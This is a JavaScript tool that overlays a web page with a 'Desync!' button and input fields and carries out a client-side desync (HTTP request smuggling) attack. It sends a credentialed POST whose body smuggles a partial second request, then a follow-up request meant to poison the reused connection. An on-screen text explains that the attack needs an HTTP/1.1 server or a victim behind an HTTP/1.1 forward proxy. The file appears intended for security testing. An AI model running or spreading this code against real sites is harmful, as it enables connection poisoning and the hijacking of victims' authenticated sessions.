// Function to insert viewport meta tag
function insertViewportMetaTag() {
  const viewportMetaTag = document.createElement('meta');
  viewportMetaTag.name = 'viewport';
  viewportMetaTag.content = 'width=device-width, initial-scale=1.0';

  // Append the meta tag to the head element
  document.head.appendChild(viewportMetaTag);
}

// Call the function to insert the viewport meta tag
insertViewportMetaTag();

// Function to insert CSS rules
function insertCSSRules() {
  const css = `
    .csd-div,
    .csd-button,
    .csd-input {
      font-family: Consolas, monaco, monospace;
    }
  `;

  const style = document.createElement('style');
  style.type = 'text/css';

  if (style.styleSheet) {
    style.styleSheet.cssText = css;
  } else {
    style.appendChild(document.createTextNode(css));
  }

  // Append the style element to the head
  document.head.appendChild(style);
}

// Call the function to insert the CSS rules
insertCSSRules();


// Function to create and style the overlay div
function createOverlayDiv() {
  const overlayDiv = document.createElement('div');
  overlayDiv.classList.add('csd-div');
  overlayDiv.style.position = 'fixed';
  overlayDiv.style.top = '0';
  overlayDiv.style.left = '0';
  overlayDiv.style.width = '100%';
  overlayDiv.style.height = '100%';
  overlayDiv.style.backgroundColor = 'rgba(0, 0, 0, 0.9)'; // Black color with 90% opacity
  overlayDiv.style.zIndex = '9999'; // Ensure it's on top

// Create a disclaimer div
const disclaimerDiv = document.createElement('div');
disclaimerDiv.innerHTML = "For these <span style='color: #FF8000;'><b>attack</b></span>s to work, it's important to note that the target web server must not support HTTP/2. Client-side desyncs rely on HTTP/1.1 connection reuse, and browsers generally favor HTTP/2 where available.<br><br>One exception to this <span style='color: #FF8000;'><b>rule</b></span> is if you suspect that your intended victim will access the site via a <span style='color: #FF8000;'><b>forward proxy</b></span> that only supports <span style='color: #FF8000;'><b>HTTP/1.1</b></span>.<br><br>Victim <--> Forward Proxy (H1) <--> Server";
disclaimerDiv.style.color = 'white'; // Set the text color
disclaimerDiv.style.padding = '20px'; // Set padding for better visibility

// Position the disclaimer under bodyInput
disclaimerDiv.style.position = 'fixed';
disclaimerDiv.style.top = '250px'; // Adjust the top position as needed
disclaimerDiv.style.left = '25px';

overlayDiv.appendChild(disclaimerDiv);

  document.body.appendChild(overlayDiv);
}

// Function to clear localStorage item
function clearLocalStorage() {
  localStorage.removeItem('csdScriptExecuted');
}

// Function to execute CSD script
function executeCSDScript() {
  const storedExecuted = localStorage.getItem('csdScriptExecuted');
  if (storedExecuted) {
    clearLocalStorage();
  }

  if (!storedExecuted) {
    const baseURL = baseURLInput.value || window.location.protocol + '//' + window.location.host;
    const bodyData = bodyInput.value ? bodyInput.value + '\r\nX: Y' : 'GET /hopefully404 HTTP/1.1\r\nX: Y';
    const injectedURL = baseURL + '?csd=1';

    fetch(baseURL, {
      method: 'POST',
      body: bodyData,
      mode: 'cors',
      credentials: 'include',
    }).then(() => {
      fetch(injectedURL, {
        mode: 'no-cors',
        credentials: 'include',
      });
    });

    localStorage.setItem('csdScriptExecuted', 'true');
  }
}

// Create a button and append it to the body at coordinate (0, 0)
const clearButton = document.createElement('button');
clearButton.textContent = 'Desync!';
clearButton.style.position = 'fixed';
clearButton.style.top = '50px'; 
clearButton.style.left = '50px'; 
clearButton.classList.add('csd-button'); // Added class for styling
clearButton.style.border = '2px solid #FF8000';
clearButton.style.borderRadius = '20px';
clearButton.style.backgroundColor = '#FF8000'; // Set background color to orange
clearButton.style.width = '100px'; // Set the width to 100px
clearButton.style.height = '30px'; // Set the height as needed
clearButton.style.fontSize = '13px';
clearButton.style.zIndex = '10000'; // Ensure it's on top
document.body.appendChild(clearButton);

// Create and append text areas
const baseURLInput = document.createElement('textarea');
baseURLInput.placeholder = 'Enter baseURL (leave empty to use default and tap desync! twice)';
baseURLInput.style.position = 'fixed';
baseURLInput.style.top = '120px';
baseURLInput.style.left = '50px'; 
baseURLInput.classList.add('csd-input'); // Added class for styling
baseURLInput.style.border = '2px solid #FF8000';
baseURLInput.style.borderRadius = '2px';
baseURLInput.style.width = '200px'; // Set the width as needed
baseURLInput.style.height = '50px'; // Set the height as needed
baseURLInput.style.fontSize = '12px';
baseURLInput.style.zIndex = '10000'; // Ensure it's on top
document.body.appendChild(baseURLInput);

const bodyInput = document.createElement('textarea');
bodyInput.placeholder = 'Enter POST body data (leave empty to use default and tap desync! twice)';
bodyInput.style.position = 'fixed';
bodyInput.style.top = '195px';
bodyInput.style.left = '50px'; 
bodyInput.classList.add('csd-input'); // Added class for styling
bodyInput.style.border = '2px solid #FF8000';
bodyInput.style.borderRadius = '2px';
bodyInput.style.width = '200px'; // Set the width as needed
bodyInput.style.height = '50px'; // Set the height as needed
bodyInput.style.fontSize = '12px';
bodyInput.style.zIndex = '10000'; // Ensure it's on top
document.body.appendChild(bodyInput);

// Focus on the baseURL input area
baseURLInput.focus();

// Execute CSD script when the button is clicked
clearButton.addEventListener('click', executeCSDScript);

// Call the function to create the overlay div
createOverlayDiv();

